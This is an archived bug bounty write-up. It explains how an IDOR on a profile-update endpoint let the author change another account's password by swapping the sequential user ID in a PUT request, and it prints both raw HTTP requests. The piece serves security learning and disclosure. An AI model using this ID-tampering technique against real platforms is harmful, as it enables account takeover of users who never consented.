# How i Find IDOR lead to account takeover

- **Source URL:** https://yazeedeliwah.medium.com/how-i-find-idor-lead-to-account-takeover-de762cc1e101?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250501182909/https://yazeedeliwah.medium.com/how-i-find-idor-lead-to-account-takeover-de762cc1e101?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9012 (id 9012)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How I Find IDOR lead to Account Takeover

# Hello Hunters , Hello Cyber-Sec Community

My Name yazeed oliwah Part Time Bug Bounty Hunter , web developer and security researcher


Today, I’m excited to share a recent find that turned a simple curiosity into a full-blown account takeover exploit, all thanks to an Insecure Direct Object Reference (IDOR) vulnerability

# The Setup: Two Accounts, One Goal

It all started with a simple test. I created two accounts on the target platform — let’s call them virus1 and virus2. Nothing fancy, just standard user accounts to poke around with. After signing up, I noticed something interesting: each account had a sequential user ID. As Example For virus1, the ID was 534, and for virus2, it was 535. Sequential IDs? That’s a classic red flag for IDOR testing. so I decided to dig deeper.

# The Attacker’s Move

Logged in as virus1 (ID: 534), I went to the account settings page and found a typical “Update Profile” feature. This included options to change the username, password, and confirm the new password. I run Burp Suite to intercept the request and see what was happening under the hood. The request looked something like this:

```
PUT/account/534 HTTP/2
Host: blackvirus.com
Cookie: XSRF-TOKEN=
eyJpdi161ntwcsszsbmdHTG1jdVRjK3dzMOVEMVESPSIsInZhbHVL1j123RHcDVCV2x6TjU2c3RshkJ DRAKSAU
RGEONRSFNDVO9OmjkywwerZ113THFWESOThyanRs5XpsNkxId3QWMHZIektycwtZYXdLCTZJR001bmJPkpU
GlwMXLlcms406g1wHhCcFpVLZYZWQvSVVSN1IwZkYzN2hJeExWbnAiLCJ EYWMIOLI3NjkxYz50GJmNzROO
YxYjcyMTMyNzFjNGVhZWUZNTJmNDU2Mzc3Njk1ZWVkNTkzZDUzNZd;bank-session=RyJpds161mp1R1RxUhXbLdUrKN]I4PWGRd2c9PSIsInZhbHVlijo:drzwzDlzalVqVExrH5swR3klajdeorcvN3ora25RRXBLSXLQWXZSTOSFUOLFT
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101
Firefox/115.0
Accept-Language: en-US, en:q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Csrf-Token: fxtGSSLZZ5IPgXM9p8UpMG7j
X-Requested-With: XMLHttpRequest
Content-Length: 65
Referer: https://blackvirus.com/account
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
username=virus1&password=New_Password&confirm_password=New_Password
```
Naturally, I wondered: What happens if I change that ID?

# The IDOR

**IDOR** vulnerabilities occur when an application uses user-supplied input (like an ID) to access objects (like accounts) without proper authorization checks. If the server blindly trusted the id parameter, I might be able to update any account’s details — not just my own. 

I modified the request, swapping the id from 534 (my attacker account, virus1) to 535 (the victim account, virus2) with same attacker cookie and session . I also updated the parameters to overwrite virus1’s credentials:

```
PUT/account/535 HTTP/2
Host: blackvirus.com
Cookie: XSRF-TOKEN=
eyJpdi161ntwcsszsbmdHTG1jdVRjK3dzMOVEMVESPSIsInZhbHVL1j123RHcDVCV2x6TjU2c3RshkJ DRAKSAU
RGEONRSFNDVO9OmjkywwerZ113THFWESOThyanRs5XpsNkxId3QWMHZIektycwtZYXdLCTZJR001bmJPkpU
GlwMXLlcms406g1wHhCcFpVLZYZWQvSVVSN1IwZkYzN2hJeExWbnAiLCJ EYWMIOLI3NjkxYz50GJmNzROO
YxYjcyMTMyNzFjNGVhZWUZNTJmNDU2Mzc3Njk1ZWVkNTkzZDUzNZd;bank-session=RyJpds161mp1R1RxUhXbLdUrKN]I4PWGRd2c9PSIsInZhbHVlijo:drzwzDlzalVqVExrH5swR3klajdeorcvN3ora25RRXBLSXLQWXZSTOSFUOLFT
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101
Firefox/115.0
Accept-Language: en-US, en:q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Csrf-Token: fxtGSSLZZ5IPgXM9p8UpMG7j
X-Requested-With: XMLHttpRequest
Content-Length: 65
Referer: https://blackvirus.com/account
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
username=virus2&password=New_Password&confirm_password=New_Password
```
NOTE: also i didn’t change the username to virus2 , but it change username and password for the id 535 account


With bated breath, I sent the request and checked the response. A clean 200 OK. No errors, no “access denied.” That’s suspicious — but was it successful?

# The Moment of Truth

To confirm the takeover, I logged out of virus1 and tried signing into virus2 with the new password . Boom — login successful! I was now in full control of virus2, all from the session of virus1. The IDOR vulnerability allowed me to overwrite the victim’s password without any authentication or ownership checks. Game over.

# Why This Matters?

An attacker with access to this endpoint could potentially enumerate IDs and take over any account on the platform. Imagine the chaos: stolen accounts, data breaches, or even pivoting to higher-privilege users if IDs were predictable. The lack of proper authorization checks on the id parameter turned a routine update function into a goldmine for attackers.

For me, this find was a reminder of how small oversights, like exposing sequential IDs and skipping authorization, can lead to big problems. It’s also why I love bug hunting: every request is a puzzle waiting to be solved

# Tips for Hunters

- Look for Sequential IDs: They’re a common IDOR giveaway.
- Digging Depper to Application: You should Test Every Request , Parameter, Endpoints . .Most Of Bugs In the Logic of Application.
- Recon,Recon And Recon

# Wrapping Up

That’s the story of how a simple ID tweak led to an account takeover. If you’ve found similar bugs or have questions about this one, drop a comment — I’d love to hear your thoughts! Until the next hunt, keep proxies running and your curiosity sharp.

Happy hunting,

Bl4cK-V1rU5
